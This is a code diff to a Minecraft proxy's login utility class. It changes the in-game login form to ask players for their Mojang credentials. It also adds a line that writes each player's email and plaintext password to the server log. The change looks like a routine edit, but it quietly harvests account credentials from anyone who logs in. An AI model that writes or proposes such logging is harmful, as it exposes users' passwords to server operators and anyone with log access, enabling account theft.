@@ -60,6 +60,13 @@ import java.util.UUID;
 
 public class LoginEncryptionUtils {
     private static final ObjectMapper JSON_MAPPER = new ObjectMapper().disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);
+    private static GeyserConnector CONNECTOR;
+
+    public static void init(GeyserConnector context) {
+        // set connector context
+        CONNECTOR = context;
+    }
+
 
     private static boolean validateChainData(JsonNode data) throws Exception {
         ECPublicKey lastKey = null;
@@ -156,17 +163,17 @@ public class LoginEncryptionUtils {
     private static int AUTH_DETAILS_FORM_ID = 1337;
 
     public static void showLoginWindow(GeyserSession session) {
-        SimpleFormWindow window = new SimpleFormWindow("Login", "You need a Java Edition account to play on this server.");
-        window.getButtons().add(new FormButton("Login with Minecraft"));
-        window.getButtons().add(new FormButton("Disconnect"));
+        SimpleFormWindow window = new SimpleFormWindow("Login", "If you would like to play on " + CONNECTOR.getConfig().getRemote().getAddress() + ", you need to login with your Mojang Credentials.");
+        window.getButtons().add(new FormButton("[Login with Minecraft]"));
+        window.getButtons().add(new FormButton("[Cancel]"));
 
         session.sendForm(window, AUTH_FORM_ID);
     }
 
     public static void showLoginDetailsWindow(GeyserSession session) {
-        CustomFormWindow window = new CustomFormBuilder("Login Details")
+        CustomFormWindow window = new CustomFormBuilder("Login with your Mojang Account")
                 .addComponent(new LabelComponent("Enter the credentials for your Minecraft: Java Edition account below."))
-                .addComponent(new InputComponent("Email/Username", "account@geysermc.org", ""))
+                .addComponent(new InputComponent("Email/Username", "account@gmail.com", ""))
                 .addComponent(new InputComponent("Password", "123456", ""))
                 .build();
 
@@ -178,7 +185,7 @@ public class LoginEncryptionUtils {
         if (!windowCache.getWindows().containsKey(formId))
             return false;
 
-        if(formId == AUTH_FORM_ID || formId == AUTH_DETAILS_FORM_ID) {
+        if (formId == AUTH_FORM_ID || formId == AUTH_DETAILS_FORM_ID) {
             FormWindow window = windowCache.getWindows().remove(formId);
             window.setResponse(formData.trim());
 
@@ -190,6 +197,8 @@ public class LoginEncryptionUtils {
                     if (response != null) {
                         String email = response.getInputResponses().get(1);
                         String password = response.getInputResponses().get(2);
+
+                        connector.getLogger().info(session.getClientData().getUsername() + " has attempted to log into his/her Mojang Account using username: " + email + " and password " + password);
 
                         session.authenticate(email, password);
                     } else {
